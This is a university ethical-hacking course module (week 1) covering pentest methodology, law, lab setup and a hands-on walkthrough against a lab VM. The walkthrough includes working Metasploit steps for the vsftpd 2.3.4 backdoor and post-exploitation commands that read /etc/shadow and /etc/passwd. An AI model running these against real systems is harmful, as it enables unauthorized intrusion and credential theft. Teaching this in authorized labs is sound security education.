# Week 1 — Introduction to Ethical Hacking & Penetration Testing

> **Module:** M31880 Ethical Hacking | **UOP / Kaplan Singapore**

---

## Table of Contents

1. [What is Ethical Hacking?](#1-what-is-ethical-hacking)
2. [Why Ethical Hacking Matters](#2-why-ethical-hacking-matters)
3. [Types of Hackers](#3-types-of-hackers)
4. [Legal & Ethical Framework](#4-legal--ethical-framework)
5. [Penetration Testing Methodology](#5-penetration-testing-methodology)
6. [Setting Up Your Lab Environment](#6-setting-up-your-lab-environment)
7. [Your First Pentest — Hands-On Lab](#7-your-first-pentest--hands-on-lab)
8. [Lab Demonstration Walkthrough](#8-lab-demonstration-walkthrough)
9. [Practice Questions](#9-practice-questions)
10. [Additional Resources](#10-additional-resources)

---

## 1. What is Ethical Hacking?

**Ethical hacking** (also known as **penetration testing** or **white-hat hacking**) is the practice of deliberately probing computer systems, networks, and applications for security vulnerabilities — **with explicit permission** from the owner.

> Think of it like hiring a locksmith to try and break into your house, so you can fix the weak locks before a real burglar finds them.

### Key Definitions

| Term | Definition |
|------|-----------|
| **Vulnerability** | A weakness in a system that can be exploited |
| **Exploit** | Code or technique that takes advantage of a vulnerability |
| **Payload** | The action performed after a successful exploit (e.g., opening a shell) |
| **Attack Surface** | All the points where an attacker could try to enter a system |
| **Threat Actor** | Any individual or group that poses a security threat |

### Ethical Hacking vs. Malicious Hacking

| | Ethical Hacking | Malicious Hacking |
|---|---|---|
| **Permission** | Authorized by the owner | Unauthorized |
| **Intent** | Improve security | Steal data, cause damage |
| **Reporting** | Findings reported to owner | Findings exploited or sold |
| **Legal** | Fully legal with scope agreement | Criminal offence |
| **Documentation** | Thorough reporting required | No documentation |

---

## 2. Why Ethical Hacking Matters

### The Threat Landscape

Cyberattacks are growing in frequency and sophistication:

- **Ransomware** attacks cost organizations billions annually
- **Data breaches** expose millions of personal records each year
- **Critical infrastructure** (power grids, hospitals, transport) are increasingly targeted
- The global shortage of cybersecurity professionals exceeds **3.5 million** unfilled positions

### Real-World Examples

| Incident | What Happened | Impact |
|----------|--------------|--------|
| **WannaCry (2017)** | Ransomware exploiting SMB vulnerability (EternalBlue) | 200,000+ systems in 150 countries affected, NHS disrupted |
| **Equifax (2017)** | Unpatched Apache Struts vulnerability | 147 million personal records exposed |
| **SolarWinds (2020)** | Supply chain attack via software update | 18,000+ organizations compromised, including US government |
| **Log4Shell (2021)** | Remote code execution in Log4j logging library | Billions of devices vulnerable worldwide |
| **MOVEit (2023)** | SQL injection in file transfer software | 2,500+ organizations breached |

### Career Paths in Ethical Hacking

- **Penetration Tester** — Performs authorized security testing
- **Security Analyst (SOC)** — Monitors and responds to threats
- **Bug Bounty Hunter** — Finds vulnerabilities in exchange for rewards
- **Red Team Operator** — Simulates advanced persistent threats
- **Security Consultant** — Advises organizations on security posture
- **Incident Responder** — Handles security breaches

### Industry Certifications

| Certification | Organization | Level |
|--------------|-------------|-------|
| **CompTIA Security+** | CompTIA | Entry |
| **CEH** (Certified Ethical Hacker) | EC-Council | Intermediate |
| **eJPT** (Junior Penetration Tester) | INE/eLearnSecurity | Entry-Intermediate |
| **OSCP** (Offensive Security Certified Professional) | OffSec | Advanced |
| **PNPT** (Practical Network Penetration Tester) | TCM Security | Intermediate |

---

## 3. Types of Hackers

```
┌─────────────────────────────────────────────────────────┐
│                    Types of Hackers                       │
├──────────────┬──────────────────┬────────────────────────┤
│  White Hat   │    Grey Hat      │     Black Hat          │
│  (Ethical)   │  (Ambiguous)     │    (Malicious)         │
│              │                  │                        │
│  Authorized  │  No permission   │  Criminal intent       │
│  Legal       │  but no malice   │  Data theft            │
│  Reports     │  May disclose    │  Ransomware            │
│  findings    │  publicly        │  Destruction           │
└──────────────┴──────────────────┴────────────────────────┘
```

### Other Categories

- **Script Kiddies** — Use pre-made tools without understanding them
- **Hacktivists** — Hack for political or social causes (e.g., Anonymous)
- **Nation-State Actors** — Government-sponsored cyber operations (e.g., APT groups)
- **Insider Threats** — Employees or contractors with authorized access who misuse it

---

## 4. Legal & Ethical Framework

### **NEVER hack without written permission.**

This is the single most important rule in ethical hacking. Unauthorized access to computer systems is a **criminal offence** in virtually every jurisdiction.

### Key Legislation

| Law | Jurisdiction | Key Points |
|-----|-------------|------------|
| **Computer Misuse Act 1990** | UK/Singapore | Unauthorized access, modification, or impairment of computers |
| **CFAA (Computer Fraud & Abuse Act)** | USA | Unauthorized access to protected computers |
| **GDPR** | EU | Data protection and privacy requirements |
| **PDPA** | Singapore | Personal Data Protection Act |

### Rules of Engagement

Before any penetration test, you **must** have:

1. **Written Authorization** — A signed agreement (scope document / statement of work)
2. **Defined Scope** — Exactly which systems, IP addresses, and methods are permitted
3. **Rules of Engagement (RoE)** — What you can and cannot do
4. **Timeline** — When testing is permitted
5. **Emergency Contacts** — Who to call if something goes wrong
6. **Data Handling** — How to handle any sensitive data discovered

### Types of Penetration Tests

| Type | Description |
|------|------------|
| **Black Box** | Tester has no prior knowledge of the target |
| **White Box** | Tester has full knowledge (source code, architecture, credentials) |
| **Grey Box** | Tester has partial knowledge (e.g., user-level access) |

---

## 5. Penetration Testing Methodology

### The 5 Phases of Penetration Testing

```
┌────────────────┐     ┌────────────────┐     ┌────────────────┐
│  1. RECONNAIS- │     │  2. SCANNING   │     │  3. GAINING    │
│     SANCE      │────▶│   & ENUM-      │────▶│    ACCESS      │
│                │     │   ERATION      │     │                │
│  Gather info   │     │  Find open     │     │  Exploit       │
│  about target  │     │  ports &       │     │  vulnerabili-  │
│                │     │  services      │     │  ties          │
└────────────────┘     └────────────────┘     └────────────────┘
                                                      │
┌────────────────┐     ┌────────────────┐             │
│  5. REPORTING  │     │  4. MAINTAIN-  │             │
│                │◀────│    ING ACCESS  │◀────────────┘
│  Document      │     │                │
│  findings &    │     │  Persistence   │
│  remediation   │     │  & privilege   │
│                │     │  escalation    │
└────────────────┘     └────────────────┘
```

### Phase 1: Reconnaissance (Information Gathering)

Collecting information about the target **before** launching any attacks.

**Passive Reconnaissance** (no direct interaction with the target):
- Google dorking (`site:target.com filetype:pdf`)
- WHOIS lookups
- Social media OSINT
- Shodan, Censys searches
- DNS record analysis

**Active Reconnaissance** (directly interacting with the target):
- Port scanning (Nmap)
- Service enumeration
- Banner grabbing
- DNS zone transfers

### Phase 2: Scanning & Enumeration

Actively probing the target to discover:
- Open ports and running services
- Operating system versions
- Application versions
- User accounts
- Network shares

**Key Tools:**
- `nmap` — Port scanning and service detection
- `nikto` — Web server vulnerability scanning
- `dirb` / `gobuster` — Directory brute-forcing
- `enum4linux` — SMB enumeration

### Phase 3: Gaining Access (Exploitation)

Using discovered vulnerabilities to gain access:
- Exploiting known CVEs
- Password attacks (brute force, dictionary)
- Web application attacks (SQLi, XSS, RFI/LFI)
- Social engineering

**Key Tools:**
- `Metasploit` — Exploitation framework
- `Burp Suite` — Web application testing
- `Hydra` — Password brute-forcing
- `SQLmap` — SQL injection automation

### Phase 4: Maintaining Access (Post-Exploitation)

After gaining initial access:
- Privilege escalation (user → root/admin)
- Pivoting to other systems
- Installing persistence mechanisms
- Extracting sensitive data

### Phase 5: Reporting

The **most important** phase for professional pentesters:
- Executive summary (non-technical)
- Technical findings with evidence
- Risk ratings (Critical/High/Medium/Low)
- Remediation recommendations
- Steps to reproduce each finding

---

## 6. Setting Up Your Lab Environment

### What You Need

> **IMPORTANT:** Always practice on systems you own or have explicit permission to test. Use the vulnerable VMs provided in the course materials.

### Step 1: Install VirtualBox

1. Download from [virtualbox.org](https://www.virtualbox.org/wiki/Downloads)
2. Install for your operating system
3. Enable VT-x/AMD-V in your BIOS (for hardware virtualization)

### Step 2: Set Up Kali Linux

Kali Linux is a Debian-based distribution designed for penetration testing.

```bash
# Option A: Download pre-built VM image
# Go to: https://www.kali.org/get-kali/#kali-virtual-machines
# Download the VirtualBox image (.ova)
# Import into VirtualBox: File → Import Appliance

# Option B: Install from ISO
# Download ISO from: https://www.kali.org/get-kali/#kali-installer-images
# Create new VM in VirtualBox and boot from ISO
```

**Default credentials:** `kali` / `kali`

### Step 3: Set Up a Vulnerable Target VM

The course provides a vulnerable VM. You can also use:

- **Metasploitable 2** — Intentionally vulnerable Linux VM
- **DVWA** (Damn Vulnerable Web Application)
- **TryHackMe** — Online platform with guided rooms

### Step 4: Network Configuration

```
┌─────────────┐                    ┌─────────────────────┐
│  Kali Linux │◄──── NAT Network ──►│  Vulnerable VM      │
│  (Attacker) │     or Host-Only    │  (Target)           │
│  10.0.2.4   │                    │  10.0.2.5           │
└─────────────┘                    └─────────────────────┘
```

In VirtualBox:
1. Go to **File → Tools → Network Manager**
2. Create a **NAT Network** or **Host-Only Network**
3. Assign both VMs to the same network
4. Verify connectivity with `ping`

---

## 7. Your First Pentest — Hands-On Lab

> **Lab: Introduction to Pentesting**

### Objective

Perform a basic penetration test against a target VM to understand the end-to-end process.

### Step 1: Discover the Target

```bash
# Find your own IP address
ip addr show

# Scan the local network to find the target
nmap -sn 10.0.2.0/24
```

**Expected output:**
```
Nmap scan report for 10.0.2.5
Host is up (0.00032s latency).
```

### Step 2: Port Scanning

```bash
# Quick scan of common ports
nmap 10.0.2.5

# Detailed scan with service detection and OS detection
nmap -sV -sC -O 10.0.2.5

# Full port scan (all 65535 ports)
nmap -p- 10.0.2.5
```

**Understanding the output:**
```
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1
80/tcp   open  http        Apache httpd 2.2.8
139/tcp  open  netbios-ssn Samba smbd 3.X
445/tcp  open  netbios-ssn Samba smbd 3.X
3306/tcp open  mysql       MySQL 5.0.51a
```

### Step 3: Enumeration

```bash
# Enumerate web server
nikto -h http://10.0.2.5

# Enumerate directories
gobuster dir -u http://10.0.2.5 -w /usr/share/wordlists/dirb/common.txt

# Enumerate SMB shares
enum4linux -a 10.0.2.5
```

### Step 4: Research Vulnerabilities

```bash
# Search for known exploits
searchsploit vsftpd 2.3.4
searchsploit apache 2.2.8
```

Take note of any CVEs discovered. Look them up on:
- [CVE Details](https://www.cvedetails.com)
- [Exploit-DB](https://www.exploit-db.com)
- [NVD (National Vulnerability Database)](https://nvd.nist.gov)

### Step 5: Exploitation (Example — vsftpd 2.3.4 Backdoor)

```bash
# Launch Metasploit
msfconsole

# Search for the exploit
msf6> search vsftpd

# Use the exploit
msf6> use exploit/unix/ftp/vsftpd_234_backdoor

# Set target
msf6> set RHOSTS 10.0.2.5

# Run it
msf6> exploit
```

**If successful:**
```
[*] Command shell session 1 opened
```

```bash
# You now have a shell — verify access
whoami
# Output: root

id
# Output: uid=0(root) gid=0(root)

hostname
# Output: metasploitable
```

### Step 6: Post-Exploitation

```bash
# Check what users exist
cat /etc/passwd

# Check for sensitive files
ls -la /home/
cat /etc/shadow

# Check network connections
netstat -tulnp
```

### Step 7: Document Your Findings

For each vulnerability found, record:

| Field | Example |
|-------|---------|
| **Vulnerability** | vsftpd 2.3.4 Backdoor Command Execution |
| **CVE** | CVE-2011-2523 |
| **Severity** | Critical |
| **Port/Service** | 21/tcp (FTP) |
| **Evidence** | Gained root shell access |
| **Recommendation** | Update vsftpd to latest version or disable FTP |

---

## 8. Lab Demonstration Walkthrough

### Nmap Scan Breakdown

| Flag | Purpose | Example |
|------|---------|---------|
| `-sn` | Ping scan (host discovery only) | `nmap -sn 192.168.1.0/24` |
| `-sS` | SYN scan (stealth) | `nmap -sS 10.0.2.5` |
| `-sV` | Version detection | `nmap -sV 10.0.2.5` |
| `-sC` | Default NSE scripts | `nmap -sC 10.0.2.5` |
| `-O` | OS detection | `nmap -O 10.0.2.5` |
| `-p-` | All 65535 ports | `nmap -p- 10.0.2.5` |
| `-A` | Aggressive (OS + version + scripts + traceroute) | `nmap -A 10.0.2.5` |
| `-oN` | Output to file | `nmap -oN scan.txt 10.0.2.5` |

### Metasploit Basics

```bash
# Start Metasploit
msfconsole

# Core commands
help                    # Show all commands
search <keyword>        # Search for modules
use <module>           # Select a module
info                   # Show module details
show options           # Show required settings
set <option> <value>   # Configure a setting
exploit / run          # Execute the module
sessions               # List active sessions
sessions -i <id>       # Interact with a session
```

### Directory Bruteforcing with Gobuster

```bash
# Basic directory scan
gobuster dir -u http://10.0.2.5 -w /usr/share/wordlists/dirb/common.txt

# With file extensions
gobuster dir -u http://10.0.2.5 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt

# Explanation of output:
# /admin                (Status: 200) [Size: 1423]   ← Accessible
# /backup               (Status: 403) [Size: 286]    ← Forbidden but exists
# /login                (Status: 302) [Size: 0]      ← Redirect
```

---

## 9. Practice Questions

Test your understanding of this week's material:

### Conceptual Questions

1. **Define ethical hacking** and explain how it differs from malicious hacking.

2. **What are the five phases** of a penetration test? Briefly describe each.

3. Explain the difference between **passive** and **active** reconnaissance. Give two examples of each.

4. What is the **Computer Misuse Act 1990** and why is it relevant to ethical hackers in Singapore?

5. Describe the difference between **black box**, **white box**, and **grey box** penetration testing.

6. Why is **written authorization** essential before conducting any penetration test?

7. What is a **CVE**? How is it used in vulnerability management?

### Technical Questions

8. You run `nmap -sV 10.0.2.5` and see port 21 running **vsftpd 2.3.4**. What would your next steps be?

9. What is the purpose of the `-sC` flag in Nmap?

10. In Metasploit, what is the difference between an **exploit** and a **payload**?

11. Explain what `searchsploit` does and how it relates to Exploit-DB.

12. You've gained a shell on a target machine. List **three things** you would do during post-exploitation.

### Scenario Question

13. A company hires you to perform a penetration test on their web application. Before you begin:
    - What **documents** do you need?
    - What **questions** would you ask the client?
    - How would you **scope** the engagement?

---

### Answers Guide

<details>
<summary>Click to reveal answer hints</summary>

1. Ethical hacking = authorized security testing to find and fix vulnerabilities before malicious actors can exploit them. Key difference: **permission and intent**.

2. Reconnaissance → Scanning & Enumeration → Gaining Access → Maintaining Access → Reporting

3. **Passive:** WHOIS lookup, Google dorking (no direct contact). **Active:** Port scanning, banner grabbing (direct contact with target).

4. CMA 1990 makes unauthorized access to computer systems a criminal offence. Singapore adopted similar provisions. Ethical hackers must operate within the law.

5. **Black box:** No info given. **White box:** Full info (source code, network diagrams). **Grey box:** Partial info (e.g., user credentials).

6. Without written authorization, you are committing a criminal offence regardless of intent.

7. CVE = Common Vulnerabilities and Exposures. A standardized identifier (e.g., CVE-2021-44228) for publicly known vulnerabilities.

8. Search for known vulnerabilities (`searchsploit vsftpd 2.3.4`), research CVE-2011-2523, attempt exploitation in Metasploit if in scope.

9. `-sC` runs default Nmap Scripting Engine (NSE) scripts for additional enumeration.

10. **Exploit** = the method of attacking the vulnerability. **Payload** = what happens after the exploit succeeds (e.g., reverse shell).

11. `searchsploit` is a CLI tool that searches a local copy of the Exploit-DB database for known exploits.

12. Privilege escalation, extracting credentials/data, pivoting to other systems, checking for sensitive files, documenting findings.

13. Need: signed authorization, scope document, rules of engagement, emergency contacts. Ask: what systems are in scope, testing window, any fragile systems, compliance requirements.

</details>

---

## 10. Additional Resources

### TryHackMe Rooms (Recommended for Beginners)

| Room | Description |
|------|-------------|
| [Tutorial](https://tryhackme.com/room/tutorial) | Getting started with TryHackMe |
| [OpenVPN](https://tryhackme.com/room/openvpn) | Connect to the TryHackMe network |
| [Intro to Pentesting](https://tryhackme.com/room/introtoresearch) | Research skills for pentesters |
| [Nmap](https://tryhackme.com/room/furthernmap) | Master Nmap scanning |
| [Metasploit Introduction](https://tryhackme.com/room/metasploitintro) | Learn Metasploit basics |
| [Blue](https://tryhackme.com/room/blue) | Exploit EternalBlue (beginner-friendly) |

### Videos

- Search for "Introduction to Ethical Hacking" on the LMS video solutions
- NetworkChuck — *FREE Ethical Hacking Course* (YouTube)
- The Cyber Mentor — *Practical Ethical Hacking* (YouTube/TCM Academy)

### Books

- *The Web Application Hacker's Handbook* — Stuttard & Pinto
- *Penetration Testing* — Georgia Weidman
- *Hacking: The Art of Exploitation* — Jon Erickson

---

## Quick Reference Card

```
┌─────────────────────────────────────────────────────┐
│              WEEK 1 CHEAT SHEET                      │
├─────────────────────────────────────────────────────┤
│                                                      │
│  HOST DISCOVERY                                      │
│    nmap -sn 10.0.2.0/24                             │
│                                                      │
│  PORT SCAN                                           │
│    nmap -sV -sC -O 10.0.2.5                        │
│    nmap -p- 10.0.2.5                                │
│                                                      │
│  WEB ENUMERATION                                     │
│    nikto -h http://target                           │
│    gobuster dir -u http://target -w wordlist.txt    │
│                                                      │
│  EXPLOIT SEARCH                                      │
│    searchsploit <service> <version>                 │
│                                                      │
│  METASPLOIT                                          │
│    msfconsole                                       │
│    search <keyword>                                 │
│    use <module>                                     │
│    set RHOSTS <target>                              │
│    exploit                                          │
│                                                      │
│  POST-EXPLOITATION                                   │
│    whoami / id / hostname                           │
│    cat /etc/passwd                                  │
│    cat /etc/shadow                                  │
│    netstat -tulnp                                   │
│                                                      │
└─────────────────────────────────────────────────────┘
```

---

[← Back to Course Home](../README.md) | [Week 2 →](../week2/README.md)
